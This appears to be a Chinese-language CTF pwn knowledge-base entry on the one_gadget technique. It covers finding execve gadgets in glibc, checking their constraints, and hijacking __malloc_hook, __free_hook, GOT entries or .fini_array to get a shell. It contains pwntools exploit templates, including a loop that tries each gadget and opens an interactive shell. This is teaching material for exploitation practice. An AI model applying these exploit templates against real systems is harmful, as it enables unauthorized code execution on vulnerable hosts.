---
category: pwn
tags: [one_gadget, execve, magic_gadget, malloc_hook, free_hook, got, fini_array, 单地址getshell, 约束满足, hook劫持]
triggers: [one gadget, one_gadget, magic gadget, single address shell, constraint, __malloc_hook, __free_hook, GOT overwrite, 单地址, 一个gadget]
related: [ret2libc, heap_uaf, format_string, rop_chain, ret2csu]
---

# One Gadget 攻击

## 什么时候用

已经有了 libc 基地址，并且能做一次任意地址写（通过 GOT 覆写、heap hook 覆写、格式化字符串等），想要用**单个地址**直接 getshell，而不需要构造完整的 ROP 链。ROP 空间极小时尤其有用。

## 前提条件

- **已知 libc 版本和基地址**
- **有任意写原语**：能往某个函数指针写入 one_gadget 地址
- **约束可满足**：one_gadget 要求特定寄存器/栈位置为 NULL 或特定值
- **glibc < 2.34**（如需写 `__malloc_hook`/`__free_hook`）；2.34+ 需用其他劫持点

## 攻击步骤

### 1. 查找 one_gadget

```bash
# 安装
gem install one_gadget

# 查找所有候选 gadget
one_gadget ./libc.so.6

# 示例输出：
# 0x4f3d5 execve("/bin/sh", rsp+0x40, environ)
# constraints:
#   rsp & 0xf == 0
#   rcx == NULL
#
# 0x4f432 execve("/bin/sh", rsp+0x40, environ)
# constraints:
#   [rsp+0x40] == NULL
#
# 0x10a41c execve("/bin/sh", rsp+0x70, environ)
# constraints:
#   [rsp+0x70] == NULL

# 通过 libc build-id 远程查询
one_gadget -b 2a4a21586d7c96cb203217146cb6570ff4468c5d
```

### 2. 验证约束条件

在 GDB 中断在即将被劫持的函数处，检查寄存器和栈状态：

```bash
# 在 gdb/pwndbg 中：
b *__malloc_hook
r
# 触发 malloc 后检查：
info registers rcx rdx
x/4gx $rsp+0x40
x/4gx $rsp+0x70
```

### 3. 劫持 __malloc_hook（glibc < 2.34）

覆写 `__malloc_hook`，任何 `malloc()` 调用都会跳转到 one_gadget：

```python
from pwn import *

libc = ELF('./libc.so.6')
one_gadgets = [0x4f3d5, 0x4f432, 0x10a41c]

# 方式一：通过格式化字符串写入
malloc_hook = libc.address + libc.sym['__malloc_hook']
writes = {malloc_hook: libc.address + one_gadgets[1]}
payload = fmtstr_payload(fmt_offset, writes, write_size='short')

# 触发 malloc（printf 大格式化字符串会内部调用 malloc）
p.sendline(b'%100000c')
```

### 4. 劫持 __free_hook（glibc < 2.34）

覆写 `__free_hook` 为 `system`，然后 `free()` 内容为 `/bin/sh` 的 chunk：

```python
# 通过 tcache poisoning 获得 __free_hook 处的写权限
free_hook = libc.address + libc.sym['__free_hook']
edit(target_chunk, p64(libc.sym['system']))

# 触发
add(99, 0x20, b'/bin/sh\x00')
delete(99)  # free("/bin/sh") -> system("/bin/sh")
```

### 5. 劫持 GOT 表（Partial RELRO）

```python
from pwn import *

context.binary = elf = ELF('./vuln')
libc = ELF('./libc.so.6')

one_gadget = libc.address + 0x4f432

# 用格式化字符串覆写 GOT
payload = fmtstr_payload(offset, {elf.got['printf']: one_gadget})
p.sendline(payload)
# 下次调用 printf 时触发 one_gadget
```

### 6. 劫持 .fini_array（Full RELRO 也可）

`.fini_array` 在 GOT 只读时仍然可写。程序 `main()` 返回后调用其中的函数指针：

```python
fini_array = elf.get_section_by_name('.fini_array').header.sh_addr
# 用任意写原语把 one_gadget 写入 .fini_array
```

### 完整 exploit 模板

```python
from pwn import *
import subprocess

context.binary = elf = ELF('./vuln')
libc = ELF('./libc.so.6')

def get_one_gadgets(libc_path):
    result = subprocess.run(['one_gadget', '-r', libc_path],
                          capture_output=True, text=True)
    return [int(x) for x in result.stdout.strip().split()]

one_gadgets = get_one_gadgets('./libc.so.6')

p = process()

# ... 泄露 libc base ...

# 逐个尝试 one_gadget
for og in one_gadgets:
    try:
        target = libc.address + og
        log.info(f"Trying one_gadget @ {hex(target)}")
        # ... 写入 target 到劫持点 ...
        # ... 触发 ...
        p.sendline(b'id')
        resp = p.recv(timeout=2)
        if b'uid' in resp:
            log.success(f"one_gadget {hex(og)} works!")
            p.interactive()
            break
    except:
        p = process()
        continue
```

### 7. 约束不满足时的调整技巧

```python
# 技巧1: 在 payload 末尾填充 NULL 字节满足 [rsp+0xN]==NULL
payload = p64(one_gadget) + b'\x00' * 100

# 技巧2: 用 realloc 调整栈帧
# __malloc_hook 写 realloc+N (跳过几个 push 改变 rsp 对齐)
# __realloc_hook 写 one_gadget
libc_realloc = libc.sym['__libc_realloc']
for realloc_off in [0, 2, 4, 6, 8, 12, 16, 20]:
    edit(__malloc_hook_chunk, p64(libc_realloc + realloc_off))
    edit(__realloc_hook_chunk, p64(one_gadget))
    trigger_malloc()  # malloc → realloc+N → 调整栈 → one_gadget

# 技巧3: 自动化尝试所有 one_gadget
for og in get_one_gadgets('./libc.so.6'):
    log.info(f"Trying: {hex(og)}")
```

## 常见坑

- **约束不满足是最常见的失败原因**：`[rsp+0x30] == NULL` 意味着栈上 rsp+0x30 处必须为 0。在 payload 后面 pad `\x00`；或换一个 gadget；或用 realloc 技巧调整栈帧。
- **从不同入口调用约束不同**：同一个 one_gadget 从 `__malloc_hook` 进入和从 GOT 进入时栈布局不同，约束满足情况也不同。在 GDB 中**实际触发点**检查。
- **glibc 2.34+ 没有 hook**：`__malloc_hook`/`__free_hook` 被移除。需要用 FSOP（House of Apple 2）、覆写 libc GOT、`_rtld_global` 或 `atexit` handler。见 [[heap_uaf]]。
- **realloc 偏移选择**：`realloc` 开头有多个 `push`，跳过不同数量会改变 rsp 对齐。常试偏移：0, 2, 4, 6, 8, 12, 16。
- **ARM64 不支持**：one_gadget 工具在 ARM64 libc 上通常找不到 gadget。考虑完整 ROP chain。

## 变体

### Angry Gadget

当 one_gadget 找不到满足条件的 gadget 时：

```bash
pip install angry_gadget
angry_gadget ./libc.so.6  # 基于 angr 符号执行，找更多候选
```

### 不同劫持点对照表

| 劫持点 | 触发方式 | 适用场景 |
|--------|---------|---------|
| `__malloc_hook` | malloc / printf 大格式化串 | glibc < 2.34 |
| `__free_hook` | free(chunk) | glibc < 2.34，堆题常用 |
| GOT 表 | 调用对应函数 | Partial RELRO |
| `.fini_array` | 程序正常退出 | 即使 Full RELRO 也可写 |
| `_IO_list_all` | exit() → FSOP | glibc 2.34+ |

### 配合格式化字符串

```python
payload = fmtstr_payload(fmt_offset,
    {libc.sym['__malloc_hook']: libc.address + one_gadget},
    write_size='short')  # %hn 逐 2 字节写
```

## 相关技术

- [[ret2libc]] — 泄露 libc 地址的基础方法
- [[heap_uaf]] — 堆利用获取任意写原语 → 写 one_gadget
- [[format_string]] — 格式化字符串获取任意写 → 写 one_gadget
- [[rop_chain]] — one_gadget 约束不满足时的后备方案
- [[ret2csu]] — 调整寄存器以满足 one_gadget 约束
